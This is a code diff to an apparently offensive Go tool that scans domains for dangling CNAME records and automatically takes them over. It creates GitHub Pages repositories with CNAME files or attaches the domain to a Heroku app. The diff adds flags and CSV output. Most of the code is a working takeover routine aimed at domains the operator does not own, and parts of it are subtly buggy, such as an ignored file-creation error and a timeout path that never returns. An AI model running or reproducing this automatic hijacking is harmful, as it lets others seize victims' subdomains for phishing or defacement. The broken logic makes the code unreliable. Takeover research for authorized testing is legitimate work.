@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"crypto/tls"
 	"encoding/csv"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -23,16 +24,20 @@ func main() {
 
 	gotenv.Load()
 
-	domainsFilePath := os.Args[1]
-	domainsFile, err := os.Open(domainsFilePath)
+	domainsFilePath := flag.String("domains", "domains.txt", "List of domains to check")
+	recordsFilePath := flag.String("data", "providers-data.csv", "CSV file containing providers' data")
+	outputFilePath := flag.String("output", "output.csv", "File to save results in")
+
+	flag.Parse()
+
+	domainsFile, err := os.Open(*domainsFilePath)
 	if err != nil {
 		log.Fatalln(err)
 	}
 	defer domainsFile.Close()
 	domainsScanner := bufio.NewScanner(domainsFile)
 
-	recordsFilePath := os.Args[2]
-	recordsFile, err := os.Open(recordsFilePath)
+	recordsFile, err := os.Open(*recordsFilePath)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -44,26 +49,40 @@ func main() {
 		log.Fatal(err)
 	}
 
+	var output [][]string
+
 	for domainsScanner.Scan() {
 		domain := domainsScanner.Text()
 
-		fmt.Println(IsReachable(domain, records))
+		output = append(output, IsReachable(domain, records))
 	}
+
+	outputFile, _ := os.Create(*outputFilePath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer outputFile.Close()
+
+	outputWriter := csv.NewWriter(outputFile)
+	outputWriter.WriteAll(output)
 }
 
-func IsReachable(domain string, records [][]string) string {
-	ch := make(chan string, 1)
+func IsReachable(domain string, records [][]string) []string {
+	ch := make(chan []string, 1)
 	go func() {
 		select {
 		case ch <- check(domain, records):
 		case <-time.After(5 * time.Second):
-			ch <- "timedout"
+			fmt.Println("timedout")
 		}
 	}()
 	return <-ch
 }
 
-func check(domain string, records [][]string) string {
+func check(domain string, records [][]string) []string {
+	// domain, provider, vulnerable, takenover
+	output := []string{domain, "", "false", "false"}
+
 	cname, _ := net.LookupCNAME(domain)
 	for i := range records{
 
@@ -75,6 +94,7 @@ func check(domain string, records [][]string) string {
 		provider_http := record[3]  // Access through http not https (true or false)
 		usesprovider, _ := regexp.MatchString(provider_cname, cname)
 		if usesprovider {
+			output[1] = provider_name
 			tr := &http.Transport{
 				Dial: (&net.Dialer{
 					Timeout: 5 * time.Second,
@@ -97,25 +117,32 @@ func check(domain string, records [][]string) string {
 			response, err := client.Get(protocol + domain)
 			if err != nil {
 				fmt.Println("")
-				return "Can't reach the domain " + domain
+				fmt.Println("Can't reach the domain " + domain)
+				return output
 			}
 
 			text, err := ioutil.ReadAll(response.Body)
 			if err != nil {
 				log.Fatal(err)
-				return "Trouble reading response"
+				fmt.Println("Trouble reading response")
+				return output
 			}
 
 			cantakeover, _ := regexp.MatchString(provider_error, string(text))
 			if cantakeover {
-				return takeover(domain, provider_name)
+				output[2] = "true"
+				if takeover(domain, provider_name) {
+					output[3] = "true"
+				}
 			}
+			return output
 		}
 	}
-	return domain + " Not found as dangling for any of the common content hosting websites"
+	fmt.Println(domain + " Not found as dangling for any of the common content hosting websites")
+	return output
 }
 
-func takeover(domain string, provider string) string {
+func takeover(domain string, provider string) bool {
 	switch provider {
 	case "github":
 		return githubcreate(domain)
@@ -123,10 +150,11 @@ func takeover(domain string, provider string) string {
 		return herokucreate(domain)
 	}
 	fmt.Printf("Found: Misconfigured %s website at %s\n", provider, domain)
-	return "This can potentially be taken over. Unfortunately, the tool does not support taking over " + provider + " websites at the moment."
+	fmt.Println("This can potentially be taken over. Unfortunately, the tool does not support taking over " + provider + " websites at the moment.")
+	return false
 }
 
-func githubcreate(domain string) string {
+func githubcreate(domain string) bool {
 
 	fmt.Println("Found: Misconfigured Github Page at " + domain)
 	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
@@ -147,6 +175,7 @@ func githubcreate(domain string) string {
 	repocreate, _, err := client.Repositories.Create("", repo)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
+		return false
 	}
 
 	reponame := *repocreate.Name
@@ -158,6 +187,7 @@ func githubcreate(domain string) string {
 	SHAvalue, _, err := client.Repositories.GetCommitSHA1(ownername, reponame, ref, "")
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
+		return false
 	}
 
 	opt := &github.Reference{
@@ -172,6 +202,7 @@ func githubcreate(domain string) string {
 	newref, _, err := client.Git.CreateRef(ownername, reponame, opt)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
+		return false
 	}
 
 	Indexpath := "index.html"
@@ -188,6 +219,7 @@ func githubcreate(domain string) string {
 	newfile1, _, err := client.Repositories.CreateFile(ownername, reponame, Indexpath, indexfile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
+		return false
 	}
 
 	cnamefile := &github.RepositoryContentFileOptions{
@@ -200,17 +232,18 @@ func githubcreate(domain string) string {
 	newfile2, _, err := client.Repositories.CreateFile(ownername, reponame, CNAMEpath, cnamefile)
 	if _, ok := err.(*github.RateLimitError); ok {
 		log.Println("hit rate limit")
+		return false
 	}
 
 	fmt.Println("Branch created at " + *newref.URL)
 	fmt.Println("Index File created at " + *newfile1.URL)
 	fmt.Println("CNAME file created at " + *newfile2.URL)
 
-	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
-
+	fmt.Println("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
+	return true
 }
 
-func herokucreate(domain string) string {
+func herokucreate(domain string) bool {
 	fmt.Println("Found: Misconfigured Heroku app at " + domain)
 	fmt.Println("Trying to take over this domain now..Please wait for a few seconds")
 
@@ -221,5 +254,6 @@ func herokucreate(domain string) string {
 	// This results in the dangling domain pointing to your Heroku appname
 	client.DomainCreate(os.Getenv("herokuappname"), domain)
 
-	return "Please check " + domain + " after a few minutes to ensure that it has been taken over.."
+	fmt.Println("Please check " + domain + " after a few minutes to ensure that it has been taken over..")
+	return true
 }
